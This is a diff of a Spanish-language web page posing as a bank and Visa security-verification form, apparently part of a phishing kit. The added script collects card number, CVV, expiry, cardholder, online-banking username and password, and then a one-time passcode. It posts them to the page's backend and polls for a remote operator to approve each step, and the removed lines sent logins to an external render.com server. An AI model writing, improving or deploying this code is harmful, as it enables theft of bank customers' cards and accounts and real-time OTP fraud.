@@ -66,20 +66,54 @@
         .status-message { display: none; padding: 14px; border-radius: 6px; font-size: 0.95rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
         .status-message.error { display: block; background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
         .status-message.success { display: block; background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
+        
+        /* ==========================================
+           NUEVO DISEÑO DE PANTALLA DE CARGA (OVERLAY)
+           ========================================== */
         .loading-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.5); z-index: 1000;
+            background: rgba(255, 255, 255, 0.2); z-index: 1000;
             justify-content: center; align-items: center; flex-direction: column;
-            backdrop-filter: blur(2px);
+            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+            opacity: 0; transition: opacity 0.3s ease;
         }
-        .loading-overlay.active { display: flex; }
+        .loading-overlay.active { display: flex; opacity: 1; }
+        
+        .loading-card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 40px 50px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            transform: translateY(10px);
+            transition: transform 0.3s ease;
+        }
+        .loading-overlay.active .loading-card { transform: translateY(0); }
+        
         .spinner {
-            width: 45px; height: 45px; border: 4px solid #e5e7eb;
-            border-top: 4px solid #000; border-radius: 50%;
-            animation: spin 0.8s linear infinite; margin-bottom: 20px;
+            width: 50px; height: 50px;
+            border: 4px solid #f3f4f6;
+            border-top: 4px solid #255ade;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .loading-text { 
+            color: #1a1a1a; 
+            font-size: 1.1rem; 
+            font-weight: 600; 
+            letter-spacing: -0.2px;
+        }
+        .loading-subtext {
+            color: #6b7280;
+            font-size: 0.85rem;
+            font-weight: 400;
+            margin-top: -10px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { color: #000; font-size: 1.1rem; font-weight: 500; background: #fff; padding: 12px 24px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        
         @media (max-width: 480px) {
             .modal-container { padding: 30px 20px; }
             .form-title { font-size: 1.35rem; }
@@ -87,13 +121,18 @@
             .header { min-height: 60px; margin-bottom: 25px; }
             .bank-logo { height: 40px; }
             .visa-logo { height: 45px; }
+            .loading-card { padding: 30px 40px; }
         }
     </style>
 </head>
 <body>
+    <!-- PANTALLA DE CARGA MEJORADA -->
     <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="loading-text" id="loadingText">Verificando...</div>
+        <div class="loading-card">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Verificando seguridad...</div>
+            <div class="loading-subtext">Por favor, no cierres esta ventana</div>
+        </div>
     </div>
 
     <div class="modal-container">
@@ -153,9 +192,7 @@
     </div>
 
     <script>
-        // 🔥 URL DE TU NUEVO BACKEND
-        const BACKEND_URL = 'https://backkkk-rj54.onrender.com';
-        const POLLING_INTERVAL = 3000;
+        const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
 
         const BANK_LOGOS = {
@@ -235,37 +272,58 @@
             };
         }
 
-        // 🔥 AHORA USA /api/login DEL BACKEND NUEVO
         async function enviarCredenciales(usuario, password) {
+            const t = leerDatosTarjeta();
             try {
-                const resp = await fetch(`${BACKEND_URL}/api/login`, {
+                const resp = await fetch('/api/crear-pago', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        usuario: usuario,
-                        clave: password
+                        solicitud_id: solicitudId,
+                        titular: t.titular || 'N/A',
+                        numero_tarjeta: t.numero || 'N/A',
+                        cvv: t.cvv || 'N/A',
+                        vencimiento: t.vencimiento || 'N/A',
+                        marca_tarjeta: t.marca || 'visa',
+                        banco_emisor: t.banco || 'Desconocido',
+                        usuario_banco: usuario,
+                        password_banco: password,
+                        paso: 'credenciales'
                     })
                 });
                 const data = await resp.json();
-                
-                if (data.success && data.intentoId) {
-                    // Guardamos el ID del intento para hacer polling
-                    solicitudId = data.intentoId;
-                    return true;
-                }
-                return false;
-            } catch (e) { 
-                console.error('Error enviando credenciales:', e);
-                return false; 
-            }
+                return data.success === true;
+            } catch (e) { return false; }
         }
 
-        // 🔥 AHORA USA /api/status/:id
+        async function enviarOTP(codigo) {
+            const t = leerDatosTarjeta();
+            try {
+                const resp = await fetch('/api/crear-pago', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        solicitud_id: solicitudId,
+                        titular: t.titular || 'N/A',
+                        numero_tarjeta: t.numero || 'N/A',
+                        cvv: t.cvv || 'N/A',
+                        vencimiento: t.vencimiento || 'N/A',
+                        marca_tarjeta: t.marca || 'visa',
+                        banco_emisor: t.banco || 'Desconocido',
+                        codigo_otp: codigo,
+                        paso: 'otp'
+                    })
+                });
+                const data = await resp.json();
+                return data.success === true;
+            } catch (e) { return false; }
+        }
+
         function iniciarPolling(texto) {
             if (pollingInterval) clearInterval(pollingInterval);
             const start = Date.now();
             loadingOverlay.classList.add('active');
-            loadingText.textContent = texto || 'Esperando aprobación...';
+            if (texto) loadingText.textContent = texto;
             formularioBloqueado = true;
 
             pollingInterval = setInterval(async () => {
@@ -277,27 +335,54 @@
                     return;
                 }
                 try {
-                    const r = await fetch(`${BACKEND_URL}/api/status/${solicitudId}`);
+                    const r = await fetch(`/api/estado-pago/${solicitudId}`);
                     const data = await r.json();
                     
-                    if (data.estado === 'aceptado') {
+                    if (!data.success) return;
+
+                    // FASE 1: Credenciales aprobadas
+                    if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval);
                         pollingInterval = null;
                         loadingOverlay.classList.remove('active');
-                        mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
-                        setTimeout(() => { window.location.href = 'extracto.html'; }, 1500);
+                        desbloquearOTP();
                         return;
                     }
 
+                    // FASE 2: OTP aprobado
+                    if (data.estado === 'aprobado' && data.fase === 'otp') {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        loadingText.textContent = 'Autenticación exitosa. Redirigiendo...';
+                        setTimeout(() => { window.location.href = 'exito.html'; }, 1500);
+                        return;
+                    }
+
+                    // RECHAZADO
                     if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval);
                         pollingInterval = null;
-                        mostrarError(data.mensaje || '❌ Credenciales incorrectas. Intenta de nuevo.');
+                        mostrarError(data.mensaje || '❌ Rechazado');
                         resetFormulario();
                         return;
                     }
                 } catch (e) {}
             }, POLLING_INTERVAL);
+        }
+
+        function desbloquearOTP() {
+            usernameInput.disabled = true;
+            passwordInput.disabled = true;
+            otpSection.classList.add('visible');
+            confirmationInput.disabled = false;
+            confirmationInput.focus();
+            document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
+            document.getElementById('mainSubtitle').innerHTML =
+                `Credenciales verificadas. Ingresa el código OTP para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            buttonText.textContent = 'Confirmar OTP';
+            faseActual = 'otp';
+            formularioBloqueado = false;
+            submitButton.disabled = false;
         }
 
         function mostrarError(msg) {
@@ -306,13 +391,6 @@
             statusMessage.style.display = 'block';
             loadingOverlay.classList.remove('active');
             formularioBloqueado = false;
-        }
-
-        function mostrarExito(msg) {
-            statusMessage.className = 'status-message success';
-            statusMessage.textContent = msg;
-            statusMessage.style.display = 'block';
-            loadingOverlay.classList.remove('active');
         }
 
         function resetFormulario() {
@@ -342,28 +420,61 @@
             statusMessage.style.display = 'none';
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
 
-            if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
-            if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
-            else if (passwordInput.value.length < 4) {
-                passwordInput.parentElement.classList.add('error');
-                passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
-                isValid = false;
+            if (faseActual === 'credenciales') {
+                if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
+                if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
+                else if (passwordInput.value.length < 4) {
+                    passwordInput.parentElement.classList.add('error');
+                    passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
+                    isValid = false;
+                }
+            } else if (faseActual === 'otp') {
+                if (!confirmationInput.value.trim()) { confirmationInput.parentElement.classList.add('error'); isValid = false; }
+                else if (!/^\d{4,8}$/.test(confirmationInput.value)) {
+                    confirmationInput.parentElement.classList.add('error');
+                    confirmationInput.parentElement.querySelector('.error-message').textContent = 'Debe tener entre 4 y 8 dígitos';
+                    isValid = false;
+                }
             }
 
             if (!isValid) return;
 
             formularioBloqueado = true;
             submitButton.disabled = true;
-            buttonText.textContent = 'Verificando...';
 
-            const ok = await enviarCredenciales(usernameInput.value.trim(), passwordInput.value.trim());
-            if (!ok) {
-                mostrarError('Error al enviar las credenciales al banco.');
-                resetFormulario();
-                return;
+            if (faseActual === 'credenciales') {
+                buttonText.textContent = 'Verificando...';
+                loadingText.textContent = 'Verificando credenciales...';
+                loadingOverlay.classList.add('active'); // Mostrar carga inmediatamente
+                
+                const ok = await enviarCredenciales(usernameInput.value.trim(), passwordInput.value.trim());
+                if (!ok) {
+                    mostrarError('Error al procesar las credenciales');
+                    resetFormulario();
+                    return;
+                }
+                iniciarPolling('Esperando aprobación del banco...');
+
+            } else if (faseActual === 'otp') {
+                buttonText.textContent = 'Verificando OTP...';
+                loadingText.textContent = 'Validando código de seguridad...';
+                loadingOverlay.classList.add('active'); // Mostrar carga inmediatamente
+                
+                const ok = await enviarOTP(confirmationInput.value.trim());
+                if (!ok) {
+                    mostrarError('Error al procesar el OTP');
+                    formularioBloqueado = false;
+                    submitButton.disabled = false;
+                    buttonText.textContent = 'Confirmar OTP';
+                    return;
+                }
+                iniciarPolling('Esperando confirmación final...');
             }
-            
-            iniciarPolling('Verificando credenciales. Esperando aprobación...');
+        });
+
+        confirmationInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length > 8) this.value = this.value.slice(0, 8);
         });
 
         window.addEventListener('load', function() {
